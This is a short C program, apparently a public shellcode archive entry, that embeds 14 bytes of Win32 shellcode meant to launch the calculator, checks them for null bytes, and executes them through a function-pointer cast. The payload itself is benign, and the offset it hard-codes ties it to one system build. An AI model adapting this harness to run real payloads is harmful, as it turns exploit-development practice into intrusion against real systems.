// Title: Win32 - Calc Shellcode
// Author: Fernando Mengali
// Contact: https://www.linkedin.com/in/fernando-mengali/
// Date: 05.24.2026
// Tested on Windows XP SP 3 - EN

#include <stdio.h>

int main()
{
    // 14 bytes, sem 0x00, com call rel32 calculado
    unsigned char shellcode[] =
        "\x31\xC0\x50\x68\x63\x61\x6C\x63\x54\xE8\xD8\x94\x9F\x77";

    printf("Executando shellcode de %d bytes...\n", sizeof(shellcode)-1);
    printf("Tem 0x00? %s\n",
           (shellcode[0]==0x00 || shellcode[1]==0x00 || shellcode[2]==0x00 ||
            shellcode[3]==0x00 || shellcode[4]==0x00 || shellcode[5]==0x00 ||
            shellcode[6]==0x00 || shellcode[7]==0x00 || shellcode[8]==0x00 ||
            shellcode[9]==0x00 || shellcode[10]==0x00 || shellcode[11]==0x00 ||
            shellcode[12]==0x00 || shellcode[13]==0x00) ? "SIM" : "NÃO");

    ((void(*)())shellcode)();

    return 0;
}

// Greetz:  Roberto Espret0  - Carol Trigo - Chor4o - Moises Stealthy